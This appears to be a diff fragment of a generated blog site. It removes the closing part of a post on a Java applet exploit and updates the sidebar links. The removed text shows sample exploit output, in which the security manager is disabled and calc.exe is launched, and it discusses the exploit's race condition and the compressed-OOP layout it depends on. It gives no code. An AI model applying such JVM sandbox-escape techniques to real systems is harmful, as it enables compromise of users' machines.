-<p><a href="http://docs.oracle.com/javase/6/docs/technotes/guides/jweb/applet/applet_deployment.html">Applet Deployment Parameters</a></p>
-
-<p>If the exploit works you will get output like this:</p>
-
-<pre><code>using arch: OOPS64
-readclassaddress:0
-found magic with: 528/528
-got class address: 564408075
-readaddress:0/0
-found magic with: 51/64
-found addresses: [574680158, 584221623]
-readObject:0
-FAKEME!
-disabled security manager
-/Users/ben
-java.io.IOException: Cannot run program "calc.exe": error=2, No such file or directory
-        at java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)
-        at Ser2.init(Ser2.java:546)
-        at Ser2.main(Ser2.java:531)
-Caused by: java.io.IOException: error=2, No such file or directory
-        at java.lang.UNIXProcess.forkAndExec(Native Method)
-        at java.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:135)
-        at java.lang.ProcessImpl.start(ProcessImpl.java:130)
-        at java.lang.ProcessBuilder.start(ProcessBuilder.java:1021)
-        ... 2 more
-</code></pre>
-
-<p>This exploits depends on a race condition that may be difficult to reproduce. We
-force the applet to run in interpreted mode to increase the chance of running
-into the race condition.</p>
-
-<p>This exploit depends on the memory layout of the JVM and is not as reliable as
-other exploits. It also appears that the compressed OOP format is different on
-Windows and Linux when compared to OSX [1]. The exploit will try to determine what
-format it should put the compressed OOPs in but it could guess wrong in which
-case the exploit is likely to crash or just not work.</p>
-
-<p>The exploit will try and print out user.home and run an apple script that will
-say some stuff and run calc.exe.</p>
-
-<p>(1): So for compressed OOPS and small heaps &lt; 4GB (maybe it needs to be smaller) you don&rsquo;t need to perform a shift so apparently on Linux and Windows JVM the shift was skipped but on OSX the shift was still being performed.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="2">&larr; Older</a>
@@ -1792,23 +1444,23 @@ say some stuff and run calc.exe.</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2018/07/06/postgresql-non-durable-reads/">Postgresql Non-Durable Reads</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2018/06/07/voltdb-command-logging-quirks/">VoltDB Command Logging Quirks</a>
       </li>
     
       <li class="post">
-        <a href="/blog/2018/06/01/fsync-db-lock-contention/">FSync DB Lock Contention</a>
+        <a href="/blog/2018/06/02/fsync-db-lock-contention/">FSync DB Lock Contention</a>
       </li>
     
       <li class="post">
-        <a href="/blog/2017/08/08/mechanically-solving-avalon/">Mechanically Solving Avalon</a>
+        <a href="/blog/2017/08/09/mechanically-solving-avalon/">Mechanically Solving Avalon</a>
       </li>
     
       <li class="post">
-        <a href="/blog/2017/08/08/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2017/03/07/dtrace-division-by-zero/">DTrace Division by Zero</a>
+        <a href="/blog/2017/08/09/avalon-fonix-slash-grabyo-meta-snapshot/">Avalon Fonix/Grabyo Meta Snapshot</a>
       </li>
     
   </ul>
